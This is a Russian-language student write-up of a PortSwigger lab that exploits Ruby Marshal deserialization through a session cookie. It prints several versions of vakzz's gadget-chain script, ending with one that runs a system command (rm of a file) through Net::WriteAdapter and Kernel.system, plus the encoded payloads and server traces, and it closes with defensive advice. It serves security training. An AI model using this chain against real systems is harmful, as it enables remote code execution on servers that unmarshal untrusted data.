
### цепочки  Ruby  +  deserialization     фреймворк Ruby on Rails
лаба https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain

Ruby on Rails. В этом фреймворке задокументированы эксплойты, позволяющие выполнять удаленный код через цепочку гаджетов.

задание:

найдите документированный эксплойт и адаптируйте его для создания вредоносного сериализованного объекта, содержащего полезную нагрузку удаленного выполнения кода. Затем передайте этот объект на веб-сайт, чтобы удалить `morale.txt` файл из домашнего каталога Карлоса.

---------

залогинился - обновил стр - перехватил запрос

```http
GET /my-account?id=wiener HTTP/2
Host: 0ac100b70469f90e80640d3d0020006a.web-security-academy.net
Cookie: session=BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVhcmIxZnJjNnZ5dTNzYzJjNHZqdmxjM20yZHRlMnNkbwY7B0YK
```

BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVhcmIxZnJjNnZ5dTNzYzJjNHZqdmxjM20yZHRlMnNkbwY7B0YK

#### `BAhv` - это сигнатура marshal (сериализация в ruby)
- `o:User` - объект класса User
- `@username` и `@access_token` - инстанс переменные
- `I"` - строка с кодировкой

декодирую base 64

```js

o:	User:@usernameI"wiener:EF:@access_tokenI"%arb1frc6vyu3sc2c4vjvlc3m2dte2sdo;F

```

в html страницы ничего интересного не нашел

-------
Для десериализации в Ruby обычно используется модуль Marshal, который может сериализовать и десериализовать сложные объекты

------

то че я нашел - это **ruby marshal** сериализованный объект, запакованный в base64

User - это обьект
как это можно использовать?
если **ruby marshal** принимает данные все - что приходят из кук - то можно подсунуть свой код
и если этот код сервер будет выполнять - то это RCE

-----

больше всего меня смущает токен @access_tokenI"%arb1frc6vyu3sc2c4vjvlc3m2dte2sdo
нужно понять - че за токен это / возможно - какой-то идентификатор сессии
гуляя по страницам - этот токен везде одинаков вроде бы как - значит наверно это типо личный токен какой-то
есть функционал смены емайл - но 1 - он не рабочий, 2 - там этот же токен

такое ощущение - что вместе с этим токеном можно подставить какой-то код, ну и этот пейлоад сериализовать!

-------

через @ добавить может новый атрибут ?

-----

что я знаю:
когда сервер получает эту куку, он делает так:

1. берет base64 строку из куки
    
2. декодирует её
    
3. передает в `Marshal.load()` так как я вижу BAhv это сигнатура Marshal , а у маршал есть load()

то есть в load() можно передавать любые данные

------

я немного испортил куку
o:	User:@usernameI"1337:EF:@access_tokenI"%arb1frc6vyu3sc2c4vjvlc3m2dte2sdo;F
закодировал
CG86CVVzZXIHOg5AdXNlcm5hbWVJIgsxMzM3BjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVhcmIxZnJjNnZ5dTNzYzJjNHZqdmxjM20yZHRlMnNkbwY7B0Y=

смотрю ответ сервера
```html
<p class=is-warning>

index.rb:13:in `load&apos;: incompatible marshal file format (can&apos;t be read) (TypeError)
	
	format version 4.8 required; 8.111 given
	
	from -e:13:in `&lt;main&gt;&apos;
	
	</p>
```

`&lt;main&gt;&apos; = < main>'`

вижу что marshal, версия 4.8 required; 8.111 given

-------


гуглю через дипсик - нахожу скприпт

```ruby
require "base64"

# Universal Ruby 2.x-3.x deserialization gadget chain
# Based on vakzz's research

cmd = "rm /home/carlos/morale.txt"

# Use a valid version string
valid_version = Gem::Version.new("0.0.1")

# Build the gadget chain with proper structure
payload = Marshal.dump([
  Gem::StubSpecification.allocate,
  {
    'name' => valid_version,
    'version' => valid_version,
    'requirements' => [
      [
        Gem::Version.new("2.0"),  # Use valid version objects
        Gem::RequestSet::GemDependencyAPI.allocate
      ]
    ],
    'loaded_from' => "|echo #{cmd} && #{cmd} #"
  }
])

# Output base64-encoded payload
puts Base64.strict_encode64(payload)
```


создаю файл 
```bash
nano exploit.rb
```

вставлю этот скрипт в файл

запускаю
```bash
ruby exploit.rb
```

получил строку новый Ruby Marshal объект
```
BAhbB286G0dlbTo6U3R1YlNwZWNpZmljYXRpb24AewlJIgluYW1lBjoGRVRVOhFHZW06OlZlcnNpb25bBkkiCjAuMC4xBjsGVEkiDHZlcnNpb24GOwZUQAlJIhFyZXF1aXJlbWVudHMGOwZUWwZbB1U7B1sGSSIIMi4wBjsGVG86JkdlbTo6UmVxdWVzdFNldDo6R2VtRGVwZW5kZW5jeUFQSQBJIhBsb2FkZWRfZnJvbQY7BlRJIkV8ZWNobyBybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCAmJiBybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCAjBjsGVA==
```

отлично!!!

теперь ее нужно подставить в куку

сперва закодирую ее URL

```
%42%41%68%62%42%32%38%36%47%30%64%6C%62%54%6F%36%55%33%52%31%59%6C%4E%77%5A%57%4E%70%5A%6D%6C%6A%59%58%52%70%62%32%34%41%65%77%6C%4A%49%67%6C%75%59%57%31%6C%42%6A%6F%47%52%56%52%56%4F%68%46%48%5A%57%30%36%4F%6C%5A%6C%63%6E%4E%70%62%32%35%62%42%6B%6B%69%43%6A%41%75%4D%43%34%78%42%6A%73%47%56%45%6B%69%44%48%5A%6C%63%6E%4E%70%62%32%34%47%4F%77%5A%55%51%41%6C%4A%49%68%46%79%5A%58%46%31%61%58%4A%6C%62%57%56%75%64%48%4D%47%4F%77%5A%55%57%77%5A%62%42%31%55%37%42%31%73%47%53%53%49%49%4D%69%34%77%42%6A%73%47%56%47%38%36%4A%6B%64%6C%62%54%6F%36%55%6D%56%78%64%57%56%7A%64%46%4E%6C%64%44%6F%36%52%32%56%74%52%47%56%77%5A%57%35%6B%5A%57%35%6A%65%55%46%51%53%51%42%4A%49%68%42%73%62%32%46%6B%5A%57%52%66%5A%6E%4A%76%62%51%59%37%42%6C%52%4A%49%6B%56%38%5A%57%4E%6F%62%79%42%79%62%53%41%76%61%47%39%74%5A%53%39%6A%59%58%4A%73%62%33%4D%76%62%57%39%79%59%57%78%6C%4C%6E%52%34%64%43%41%6D%4A%69%42%79%62%53%41%76%61%47%39%74%5A%53%39%6A%59%58%4A%73%62%33%4D%76%62%57%39%79%59%57%78%6C%4C%6E%52%34%64%43%41%6A%42%6A%73%47%56%41%3D%3D
```

подставляю в ориг запрос

```http
GET /my-account?id=wiener HTTP/2
Host: 0ac100b70469f90e80640d3d0020006a.web-security-academy.net
Cookie: session=%42%41%68%62%42%32%38%36%47%30%64%6C%62%54%6F%36%55%33%52%31%59%6C%4E%77%5A%57%4E%70%5A%6D%6C%6A%59%58%52%70%62%32%34%41%65%77%6C%4A%49%67%6C%75%59%57%31%6C%42%6A%6F%47%52%56%52%56%4F%68%46%48%5A%57%30%36%4F%6C%5A%6C%63%6E%4E%70%62%32%35%62%42%6B%6B%69%43%6A%41%75%4D%43%34%78%42%6A%73%47%56%45%6B%69%44%48%5A%6C%63%6E%4E%70%62%32%34%47%4F%77%5A%55%51%41%6C%4A%49%68%46%79%5A%58%46%31%61%58%4A%6C%62%57%56%75%64%48%4D%47%4F%77%5A%55%57%77%5A%62%42%31%55%37%42%31%73%47%53%53%49%49%4D%69%34%77%42%6A%73%47%56%47%38%36%4A%6B%64%6C%62%54%6F%36%55%6D%56%78%64%57%56%7A%64%46%4E%6C%64%44%6F%36%52%32%56%74%52%47%56%77%5A%57%35%6B%5A%57%35%6A%65%55%46%51%53%51%42%4A%49%68%42%73%62%32%46%6B%5A%57%52%66%5A%6E%4A%76%62%51%59%37%42%6C%52%4A%49%6B%56%38%5A%57%4E%6F%62%79%42%79%62%53%41%76%61%47%39%74%5A%53%39%6A%59%58%4A%73%62%33%4D%76%62%57%39%79%59%57%78%6C%4C%6E%52%34%64%43%41%6D%4A%69%42%79%62%53%41%76%61%47%39%74%5A%53%39%6A%59%58%4A%73%62%33%4D%76%62%57%39%79%59%57%78%6C%4C%6E%52%34%64%43%41%6A%42%6A%73%47%56%41%3D%3D
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac100b70469f90e80640d3d0020006a.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

ошибка 500 index.rb:14:in `&lt;main&gt;&apos;: undefined method `username&apos; for #&lt;Array:0x000055d8581f7d50&gt; (NoMethodError)

пробую без кодировки URL

тоже 500 index.rb:14:in `&lt;main&gt;&apos;: undefined method `username&apos; for #&lt;Array:0x0000559457e70c20&gt; (NoMethodError)

---------

ошибка NoMethodError!!

-------



пробую скрипт  статьи на [devcraft.io](https://devcraft.io/)

```ruby
# Universal Deserialisation Gadget for Ruby 2.x-3.x
# by vakzz

require 'base64'

class Gem::StubSpecification
  def initialize; end
end

stub_spec = Gem::StubSpecification.allocate
stub_spec.instance_variable_set(:@loaded_from, "|rm /home/carlos/morale.txt 2>&1 |")

cmd = Gem::RequestSet.allocate
cmd.instance_variable_set(:@git_set, stub_spec)

payload = Marshal.dump([Gem::Specification.allocate, cmd, stub_spec])
puts Base64.strict_encode64(payload)
```


запустил - получил новый обьект
```
BAhbCHU6F0dlbTo6U3BlY2lmaWNhdGlvbkQECFsYMDAwMEl1OglUaW1lDUCHH8AAAAAABjoJem9uZUkiCFVUQwY6BkVGMDAwMDBJIgAGOwdUMDAwMFQwMDBvOhRHZW06OlJlcXVlc3RTZXQGOg1AZ2l0X3NldG86G0dlbTo6U3R1YlNwZWNpZmljYXRpb24GOhFAbG9hZGVkX2Zyb21JIid8cm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQgMj4mMSB8BjoGRVRACA==
```
подставил - отправил
ответ 500 

```
/usr/lib/ruby/2.7.0/rubygems/specification.rb:1267:in `load&apos;: dump format error(0x0) (ArgumentError)
	from /usr/lib/ruby/2.7.0/rubygems/specification.rb:1267:in `_load&apos;
	from -e:13:in `load&apos;
	from -e:13:in `&lt;main&gt;&apos;
```

------


статья vakzz на [devcraft.io](https://devcraft.io/)

```ruby
require 'base64'

# Universal Deserialisation Gadget for Ruby 2.x-3.x
# by vakzz (https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)

# Autoload required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa = Net::WriteAdapter.new(Kernel, :system)

io = Gem::Package::TarReader::Entry.allocate
io.instance_variable_set('@read', 0)
io.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', io)
n.instance_variable_set('@debug_output', wa)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

# Output base64-encoded payload
puts Base64.strict_encode64(payload)

```

создаю файл 
```bash
nano exploit.rb
```
запускаю
```bash
ruby exploit.rb
```


получаю строку
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG0LS2VybmVsOg9AbWV0aG9kX2lkOgtzeXN0ZW0=

ответ 500
```
sh: 1: reading: not found
/usr/lib/ruby/2.7.0/net/protocol.rb:155:in `read&apos;: undefined method `size&apos; for nil:NilClass (NoMethodError)
	from /usr/lib/ruby/2.7.0/rubygems/package/tar_header.rb:103:in `from&apos;
	from /usr/lib/ruby/2.7.0/rubygems/package/tar_reader.rb:61:in `each&apos;
	from /usr/lib/ruby/2.7.0/rubygems/requirement.rb:297:in `fix_syck_default_key_in_requirements&apos;
	from /usr/lib/ruby/2.7.0/rubygems/requirement.rb:207:in `marshal_load&apos;
	from -e:13:in `load&apos;
	from -e:13:in `&lt;main&gt;&apos;
```

-------




дипсик помогает и дает скрипт

```ruby
require 'base64'

# Universal Deserialisation Gadget for Ruby 2.x-3.x - FINAL VERSION
# by vakzz (https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)

# Autoload required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

cmd = "rm /home/carlos/morale.txt"

# First adapter calls system with our command
wa1 = Net::WriteAdapter.new(Kernel, :system)

# RequestSet will call wa1 with cmd as argument
rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', cmd)

# Second adapter calls rs.resolve
wa2 = Net::WriteAdapter.new(rs, :resolve)

# Build the TarReader chain
io = Gem::Package::TarReader::Entry.allocate
io.instance_variable_set('@read', 0)
io.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', io)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

# Вывод в нужном формате (как просит лаба)
puts Base64.strict_encode64(payload)
```

создаю файл 
```bash
nano exploit.rb
```
запускаю
```bash
ruby exploit.rb
```


получаю строку
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==

ответ 500
```
                   <p class=is-warning>sh: 1: reading: not found
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system&apos;: no implicit conversion of nil into String (TypeError)
	from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&apos;
	from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&apos;
	from /usr/lib/ruby/2.7.0/rubygems/request_set.rb:400:in `resolve&apos;
	from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&apos;
	from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&apos;
	from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG&apos;
	from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read&apos;
	from /usr/lib/ruby/2.7.0/rubygems/package/tar_header.rb:103:in `from&apos;
	from /usr/lib/ruby/2.7.0/rubygems/package/tar_reader.rb:61:in `each&apos;
	from /usr/lib/ruby/2.7.0/rubygems/requirement.rb:297:in `fix_syck_default_key_in_requirements&apos;
	from /usr/lib/ruby/2.7.0/rubygems/requirement.rb:207:in `marshal_load&apos;
	from -e:13:in `load&apos;
	from -e:13:in `&lt;main&gt;&apos;</p>
```

⭐️⭐️⭐️⭐️⭐️ ЛАБА РЕШЕНА!!!!!!!⭐️





adingReading

-----------


## что я понял про Ruby deserialization

BAhv в начале куки — это сигнатура Ruby Marshal, как aced0005 для Java

Marshal.load() десериализует любые данные из куки без проверки, это главная дыра

цепочка гаджетов vakzz использует стандартные классы Ruby (Gem, Net, Kernel) которые есть в любой системе

Net::WriteAdapter позволяет вызвать любой метод у любого объекта, в том числе system

Gem::RequestSet нужен чтобы передать контролируемый аргумент в system

TarReader и BufferedIO строят цепочку от Requirement до WriteAdapter

даже если после выполнения сыпятся ошибки типа undefined method username — команда уже выполнилась

------
## как защититься от Ruby deserialization

никогда не использовать Marshal.load() на данных от пользователя, это гарантированный RCE

использовать безопасные форматы JSON или YAML с SafeLoader вместо Marshal

подписывать куки HMAC и проверять подпись перед десериализацией

обновлять Ruby и Rails до последних версий, где патчат такие цепочки

не хранить чувствительные объекты в сериализованном виде, использовать сессии на сервере

использовать белый список классов при десериализации, запрещать всё кроме строго необходимого

в production отключать autoload для классов, которые могут стать гаджетами


-------
